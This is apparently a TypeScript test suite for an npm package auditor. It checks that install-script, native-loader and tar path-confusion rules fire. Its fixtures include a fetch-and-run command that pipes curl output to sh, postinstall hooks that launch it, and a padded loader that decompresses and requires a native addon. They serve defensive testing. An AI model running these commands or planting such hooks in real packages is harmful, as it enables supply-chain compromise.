import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { gzipSync } from "node:zlib";
import { auditTarball, runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core review round 4: retention under both readings, .py/.pl/.rb, literal .node
// launch in the overflow fallback, quoted words, linear trim, inline shell code,
// case-folded collisions.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };

function tarBytes(entries: { name: string; data: string }[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data, "latin1");
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write("0", 156);
    h.write("ustar\0" + "00", 257);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}
const pkg = (scripts?: Record<string, string>, extra: object = {}) =>
  JSON.stringify({ name: "demo", version: "1.0.0", ...(scripts ? { scripts } : {}), ...extra });
const criticalInstall = async (entries: { name: string; data: string }[]) => {
  const report = await auditTarball({ meta, tarball: tarBytes(entries) });
  return report.findings.filter((f) => f.ruleId === "install-scripts" && f.severity === "critical").length;
};
const confusion = async (entries: { name: string; data: string }[]) => {
  const report = await auditTarball({ meta, tarball: tarBytes(entries) });
  return { found: report.findings.find((f) => f.ruleId === "manifest-confusion"), verdict: report.verdict };
};

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, scripts: Record<string, string>): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify({ scripts })));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const crit = (files: Record<string, string>, cmd: string) =>
  runRules(inputFor(files, { postinstall: cmd })).filter((x) => x.ruleId === "install-scripts" && x.severity === "critical");

describe("retention is evaluated under both readings", () => {
  test("`package/assets.v1\\setup` is extension-less to Windows and is scanned", async () => {
    const n = await criticalInstall([
      { name: "package/package.json", data: pkg({ postinstall: "node assets.v1/setup" }) },
      { name: "package/assets.v1\\setup", data: `${CURL_SH}\n` },
    ]);
    assert.equal(n, 1);
  });

  test("`.py`, `.pl` and `.rb` files are retained and scanned through a real tarball", async () => {
    for (const [name, cmd] of [["evil.py", "python3 evil.py"], ["evil.pl", "perl evil.pl"], ["evil.rb", "ruby evil.rb"]] as const) {
      const n = await criticalInstall([
        { name: "package/package.json", data: pkg({ postinstall: cmd }) },
        { name: `package/${name}`, data: `${CURL_SH}\n` },
      ]);
      assert.equal(n, 1, cmd);
    }
  });
});

describe("overflow fallback counts a literal native-addon require()", () => {
  test("pad + read, decode, write and require('./output.node') stays critical and blocks", async () => {
    const chain = `
const fs=require('fs'),zlib=require('zlib'),path=require('path');
const c=fs.readFileSync(path.join(__dirname,'intro.bin'));
fs.writeFileSync(path.join(__dirname,'output.node'),zlib.gunzipSync(c));
require('./output.node');`;
    const pad = `${"(".repeat(100000)}x${")".repeat(100000)};\n`;
    const report = await auditTarball({
      meta,
      tarball: tarBytes([
        { name: "package/package.json", data: pkg(undefined, { main: "index.js" }) },
        { name: "package/index.js", data: pad + chain },
      ]),
    });
    assert.ok(report.findings.some((f) => f.ruleId === "native-payload-loader" && f.severity === "critical"));
    assert.equal(report.verdict, "block");
  });
});

describe("install-scripts command parsing", () => {
  test("quoted command words: `'node' ./setup` and `\"sh\" build`", () => {
    assert.equal(crit({ "package/setup": `${CURL_SH}\n` }, "'node' ./setup").length, 1);
    assert.equal(crit({ "package/build": `${CURL_SH}\n` }, '"sh" build').length, 1);
  });

  test("a 1 MiB word of closing punctuation followed by x stays fast", () => {
    for (const ch of [")", '"', "'", "`", "("]) {
      const cmd = `node ${ch.repeat(1024 * 1024)}x`;
      const t = performance.now();
      runRules(inputFor({ "package/setup": "x" }, { postinstall: cmd }));
      const ms = performance.now() - t;
      console.log(`[timing] trim ${ch}: ${ms.toFixed(0)} ms`);
      // Linear (about 150 ms per MiB of backticks locally, several times that on CI); quadratic would take minutes.
      assert.ok(ms < 5000, `${ch} took ${ms.toFixed(0)} ms`);
    }
  });

  test("inline shell code is resolved as a command line", () => {
    assert.equal(crit({ "package/evil.sh": `${CURL_SH}\n` }, "sh -c ./evil.sh").length, 1);
    assert.equal(crit({ "package/evil.js": `${CURL_SH}\n` }, 'bash -c "node evil"').length, 1);
    assert.equal(crit({ "package/evil.js": `${CURL_SH}\n` }, "bash -c 'node evil.js && echo done'").length, 1);
    assert.equal(crit({ "package/evil.js": `${CURL_SH}\n` }, "sh -c 'sh -c \"node evil\"'").length, 1);
    assert.equal(crit({ "package/README": "docs\n" }, 'sh -c "echo hi"').length, 0);
  });
});

describe("case-folded path collisions between tar readings", () => {
  test("`package\\X.js` with `package/x.js` fires and blocks", async () => {
    const { found, verdict } = await confusion([
      { name: "package/package.json", data: pkg() },
      { name: "package/x.js", data: "// benign\n" },
      { name: "package\\X.js", data: "// other\n" },
    ]);
    assert.ok(found, "manifest-confusion expected");
    assert.match(found.message, /collision between tar readings/);
    assert.equal(verdict, "block");
  });

  test("a Windows copy colliding with an unretained binary fires", async () => {
    const elf = "\x7fELF\0\0\0\0\0\0\0\0";
    const { found } = await confusion([
      { name: "package/package.json", data: pkg() },
      { name: "package/addon.node", data: elf },
      { name: "package\\addon.node", data: "// js\n" },
    ]);
    assert.ok(found, "manifest-confusion expected");
  });

  test("ordinary POSIX-only case pairs are not flagged", async () => {
    const { found } = await confusion([
      { name: "package/package.json", data: pkg() },
      { name: "package/LICENSE", data: "a\n" },
      { name: "package/license", data: "b\n" },
    ]);
    assert.equal(found, undefined);
  });
});
